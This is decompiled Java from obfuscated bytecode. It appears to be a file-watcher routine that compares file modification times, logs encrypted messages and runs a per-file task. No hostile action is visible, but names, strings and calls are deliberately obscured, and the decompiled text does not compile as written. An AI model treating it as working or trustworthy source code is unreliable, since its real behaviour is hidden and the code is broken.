/*
 * Decompiled with CFR 0_123.
 */
import java.io.File;
import java.lang.invoke.ConstantCallSite;
import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;
import java.lang.reflect.Method;

class sILv$1
extends CxNA {
    final /* synthetic */ sILv VMrC;

    sILv$1(sILv sILv2) {
        this.VMrC = sILv2;
    }

    @Override
    public void run() {
        Object object = sILv$1.Kv(sILv$1.Kv(sILv$1.Kv((sILv)o.a(this, -2032511125))));
        while (object.hasNext()) {
            File file = (File)object.next();
            try {
                block7 : {
                    block8 : {
                        if (sILv$1.Kv(file) == false) break block7;
                        if (sILv$1.Kv(file) != sILv$1.Kv((Long)sILv$1.Kv(sILv$1.Kv((sILv)o.a(this, -2032511125)), file))) break block8;
                        if (sILv$1.Kv(file) == sILv$1.Kv((Long)sILv$1.Kv(sILv$1.Kv((sILv)o.a(this, -2032511125)), file))) break block7;
                    }
                    sILv$1.Kv(sILv$1.Kv(sILv$1.Kv(new StringBuilder((String)sILv$1.Kv(sILv$1.Kv(file))), mrFx$WjFM.d("\u4571\u8b96\u4e88\u1770\ue59e\u2e26\u6631\u3252\ua675"))));
                    ((Runnable)sILv$1.Kv(sILv$1.Kv((sILv)o.a(this, -2032511125)), file)).run();
                    sILv$1.Kv(sILv$1.Kv((sILv)o.a(this, -2032511125)), file, sILv$1.Kv(sILv$1.Kv(file)));
                    sILv$1.Kv(sILv$1.Kv((sILv)o.a(this, -2032511125)), file, sILv$1.Kv(sILv$1.Kv(file)));
                }
                if (sILv$1.Kv(file) != false) {
                    if (sILv$1.Kv(file) == false) continue;
                }
                sILv$1.Kv(sILv$1.Kv(sILv$1.Kv(new StringBuilder((String)sILv$1.Kv(sILv$1.Kv(file))), mrFx$WjFM.d("\u4571\u8b9f\u4e82\u1778\ue592\u2e34\u663d\u3253\ua63d\u4c2c\ub011\u5a06\u523a\u7fb0\u86f4\u358f\u1a92\u536c\uc0dd\u9739\ud9fe"))));
                sILv$1.Kv((sILv)o.a(this, -2032511125), file);
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
    }

    private static Object Kv(Object object, Object object2, Object object3) {
        try {
            return new ConstantCallSite(((MethodHandles.Lookup)object).unreflect(o.Y(Integer.valueOf((String)object2, 32))).asType((MethodType)object3));
        }
        catch (ClassNotFoundException | IllegalAccessException reflectiveOperationException) {
            throw new BootstrapMethodError(reflectiveOperationException);
        }
    }
}

